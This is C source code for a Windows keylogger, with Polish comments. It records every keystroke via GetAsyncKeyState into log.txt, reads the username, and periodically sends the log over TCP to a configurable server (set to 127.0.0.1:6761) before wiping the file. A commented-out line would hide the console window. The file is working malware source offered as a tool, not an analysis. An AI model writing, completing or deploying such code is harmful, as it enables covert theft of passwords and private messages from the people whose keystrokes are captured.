#include <windows.h>
#include <stdio.h>
#include <winsock.h>

// compile: gcc logger.c -o logger.exe -lws2_32

#define SERVER "127.0.0.1"
#define PORT 6761

void logKey(int key) {
    FILE *file = fopen("log.txt", "a+");
    if (file == NULL) return;

    if (key == 0x20) fprintf(file, " ");
    else if (key == 0x0D) fprintf(file, "\n");
    else if (key == 0x09) fprintf(file, "\t");
    else if (key == 0x08) fprintf(file, "[BACKSPACE]");
    else if (key >= 32 && key <= 126) fprintf(file, "%c", key);
    else fprintf(file, "[%d]", key);

    fclose(file);
}

void sendLogs(){
    //=================================================== otwieranie pliku txt
    FILE *file = fopen("log.txt", "r");
    int znak = fgetc(file);
    if(file == NULL) return;
    if(znak == EOF){
        printf("Puste logi \n");
        fclose(file);
        return;
    }
    //=================================================== TCP

    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in serv_addr;

    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        printf("Błąd inicjalizacji Winsock: %d", WSAGetLastError());
        return;
    }
    if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        printf("\nBlad tworzenia gniazda\n");
        return;
    }
    
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if(inet_pton(AF_INET, SERVER, &serv_addr.sin_addr) <= 0){
        printf("\nNieprawidłowy adres / Adres nieobsługiwany \n");
        return;
    }

    if(connect(sock,(struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
        printf("\nPołączenie nieudane \n");
        return;
    }

    int len = 1024, i = 0;
    char wiadomosc[1024] = "";
    printf("\nzaczynanie wysyłania ----------------\n");
    //=================================================== wysylanie pliku txt

    while(znak != EOF){
        printf("%c", znak);
        wiadomosc[i]=(char)znak;
        i++;
        if(i == 1024){
            printf("\nwysylanie pakietu: \n");
            send(sock, wiadomosc, i+1, 0);
            i = 0;
        }
        znak = fgetc(file);
    }
    wiadomosc[i] = '\0';
    printf("\nwysylanie ostatniego pakietu: %s\n", wiadomosc);
    send(sock, wiadomosc, i+1, 0);
    printf("wyslane \n");

    //=================================================== czekanie na przyjecie serwera

    char buffer[64];
    len = recv(sock, buffer, sizeof(buffer) - 1, 0);

    printf("\n\n odebrane \n\n");

    //=================================================== "sprzatanie" oraz czyszczenie pliku txt

    fclose(file);
    close(sock);
    WSACleanup();
    fclose(fopen("log.txt", "w"));
    printf("\n koniec \n");
}

int main() {
    //ShowWindow(GetConsoleWindow(), 0);
    char username[256];
    DWORD size = sizeof(username);

    if (GetUserNameA(username, &size)) {
        printf("USERNAME: %s\n", username);
    } else {
        printf("Blad: %lu\n", GetLastError());
    }

    //sendLogs();

    int cooldown = 0;
    while (1) {
        cooldown++;
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                logKey(key);
            }
        }
        Sleep(10);
        if(cooldown==1000){
            printf("sending payload");
            sendLogs();
            cooldown=0;
        }
    }
    return 0;
}